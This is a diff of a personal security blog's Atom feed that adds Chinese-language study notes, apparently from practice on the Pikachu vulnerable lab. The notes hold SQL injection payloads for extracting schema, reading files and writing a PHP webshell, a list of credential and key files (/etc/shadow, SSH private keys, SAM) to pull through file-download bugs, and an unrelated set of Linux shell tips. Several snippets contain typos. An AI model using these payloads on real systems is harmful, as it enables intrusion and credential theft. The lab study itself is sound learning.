@@ -6,7 +6,7 @@
   <link href="http://ericcd.com/atom.xml" rel="self"/>
   
   <link href="http://ericcd.com/"/>
-  <updated>2022-07-23T03:50:12.325Z</updated>
+  <updated>2022-09-20T12:39:12.613Z</updated>
   <id>http://ericcd.com/</id>
   
   <author>
@@ -15,6 +15,69 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>pikachu</title>
+    <link href="http://ericcd.com/2022/09/20/pikachu/"/>
+    <id>http://ericcd.com/2022/09/20/pikachu/</id>
+    <published>2022-09-20T12:21:49.000Z</published>
+    <updated>2022-09-20T12:39:12.613Z</updated>
+    
+    <content type="html"><![CDATA[<p>记录一些在使用 pikahcu 练习时用到的命令。<br /><span id="more"></span></p><h1 id="sql-注入"><a class="anchor" href="#sql-注入">#</a> SQL 注入</h1><ol><li>获取数据库名<br /> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># union select database ()</span><br></pre></td></tr></table></figure></li><li>获取表名<br /> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># union select group_concat (table_name) from information_schema.tables where table_schema=database ()</span><br></pre></td></tr></table></figure></li><li>获取列名<br /> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># union select group_concat (table_name) from information_schema.columns where table_name=&#x27; 表名 &#x27;</span><br></pre></td></tr></table></figure></li><li>读文件<br /> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># union select load_file (&#x27;Path&#x27;) from 表名 </span><br></pre></td></tr></table></figure></li><li>写文件<br /> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># union select &#x27;&lt;!php assert ($_POST [1];?)&gt;&#x27; into outfile &#x27;Path&#x27;</span><br></pre></td></tr></table></figure></li><li>报错回显<br /> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># and updatexml (1,concat (0x7e,(select database ()),0x7e),1))</span><br></pre></td></tr></table></figure></li></ol>]]></content>
+    
+    
+    <summary type="html">&lt;p&gt;记录一些在使用 pikahcu 练习时用到的命令。&lt;br /&gt;</summary>
+    
+    
+    
+    <category term="web" scheme="http://ericcd.com/categories/web/"/>
+    
+    
+    <category term="web" scheme="http://ericcd.com/tags/web/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>linux-command</title>
+    <link href="http://ericcd.com/2022/08/31/linux-command/"/>
+    <id>http://ericcd.com/2022/08/31/linux-command/</id>
+    <published>2022-08-31T07:02:26.000Z</published>
+    <updated>2022-09-20T12:21:25.778Z</updated>
+    
+    <content type="html"><![CDATA[<p>记录一些 linux 环境下会用到的命令。<br /><span id="more"></span></p><ol><li><p>设置代理。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># export http_proxy=&#x27;http://windows 的 ip: 代理端口 &#x27;</span><br><span class="line"># curl -vv google.com</span><br><span class="line"># git config --global https.proxy http://windows 的 ip: 代理端口 </span><br><span class="line"># git config --global https.proxy https://windows 的 ip: 代理端口 </span><br><span class="line"># git config --global http.proxy &#x27;socks5://windows 的 ip: 代理端口 &#x27;</span><br><span class="line"># git config --global https.proxy &#x27;socks5://windows 的 ip: 代理端口 &#x27;</span><br></pre></td></tr></table></figure></p></li><li><p>批量添加后缀名。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># find . -type f | awk -F &quot;.&quot; &#x27;&#123;print $2&#125;&#x27; | xargs -i -t mv ./&#123;&#125; ./&#123;&#125;.apk</span><br></pre></td></tr></table></figure></p></li><li><p>查看 python 版本。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#  ls /usr/bin/python*</span><br><span class="line"></span><br></pre></td></tr></table></figure></p></li><li><p>添加 python 版本。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#  sudo update-alternatives --install /usr/bin/python python /usr/bin/python3.6 1</span><br><span class="line"></span><br></pre></td></tr></table></figure></p></li><li><p>查看和更换 python 版本。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#  update-alternatives --config python</span><br><span class="line"></span><br></pre></td></tr></table></figure></p></li></ol>]]></content>
+    
+    
+    <summary type="html">&lt;p&gt;记录一些 linux 环境下会用到的命令。&lt;br /&gt;</summary>
+    
+    
+    
+    <category term="linux" scheme="http://ericcd.com/categories/linux/"/>
+    
+    
+    <category term="linux" scheme="http://ericcd.com/tags/linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>文件包含漏洞可以尝试下载的文件</title>
+    <link href="http://ericcd.com/2022/08/20/file-download/"/>
+    <id>http://ericcd.com/2022/08/20/file-download/</id>
+    <published>2022-08-20T08:20:20.000Z</published>
+    <updated>2022-08-20T08:24:46.738Z</updated>
+    
+    <content type="html"><![CDATA[<p>记录一些利用文件下载漏洞下载的目标文件。<br /><span id="more"></span><br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#    Windows</span><br><span class="line">#    C:\boot.ini// 查看系统版本 </span><br><span class="line">#    C:\Windows\System32\inetsrv\MetaBase.xml//IIS 配置文件 </span><br><span class="line">#    C:\Windows\repair\sam // 存储系统初次安装的密码 </span><br><span class="line">#    C:\Program Files\mysql\my.ini//Mysql 配置 </span><br><span class="line">#    C:\Program Files\mysql\data\mysql\user.MYD//Mysql root</span><br><span class="line">#    C:\Windows\php.ini//php 配置信息 </span><br><span class="line">#    C:\Windows\my.ini//Mysql 配置信息 </span><br><span class="line">#    C:\Windows\win.ini//Windows 系统的一个基本系统配置文件 </span><br><span class="line">#   </span><br><span class="line">#    Linux</span><br><span class="line">#    /root/.ssh/authorized_keys</span><br><span class="line">#    /root/.ssh/id_rsa</span><br><span class="line">#    /root/.ssh/id_ras.keystore</span><br><span class="line">#    /root/.ssh/known_hosts// 记录每个访问计算机用户的公钥 </span><br><span class="line">#    /etc/passwd</span><br><span class="line">#    /etc/shadow</span><br><span class="line">#    /usr/local/app/php5/lib/php.ini//PHP 配置文件 </span><br><span class="line">#    /etc/my.cnf//mysql 配置文件 </span><br><span class="line">#    /etc/httpd/conf/httpd.conf//apache 配置文件 </span><br><span class="line">#    /root/.bash_history// 用户历史命令记录文件 </span><br><span class="line">#    /root/.mysql_history//mysql 历史命令记录文件 </span><br><span class="line">#    /proc/mounts// 记录系统挂载设备 </span><br><span class="line">#    /porc/config.gz// 内核配置文件 </span><br><span class="line">#    /var/lib/mlocate/mlocate.db// 全文件路径 </span><br><span class="line">#    /porc/self/cmdline// 当前进程的 cmdline 参数 </span><br></pre></td></tr></table></figure></p>]]></content>
+    
+    
+    <summary type="html">&lt;p&gt;记录一些利用文件下载漏洞下载的目标文件。&lt;br /&gt;</summary>
+    
+    
+    
+    <category term="web" scheme="http://ericcd.com/categories/web/"/>
+    
+    
+    <category term="web" scheme="http://ericcd.com/tags/web/"/>
+    
+  </entry>
   
   <entry>
     <title>vulhub 相关命令</title>
@@ -205,13 +268,13 @@
     
     <category term="Android逆向" scheme="http://ericcd.com/tags/Android%E9%80%86%E5%90%91/"/>
     
+    <category term="Android Studio" scheme="http://ericcd.com/tags/Android-Studio/"/>
+    
     <category term="apktool" scheme="http://ericcd.com/tags/apktool/"/>
     
     <category term="jarsign" scheme="http://ericcd.com/tags/jarsign/"/>
     
     <category term="010Editor" scheme="http://ericcd.com/tags/010Editor/"/>
-    
-    <category term="Android Studio" scheme="http://ericcd.com/tags/Android-Studio/"/>
     
   </entry>
   
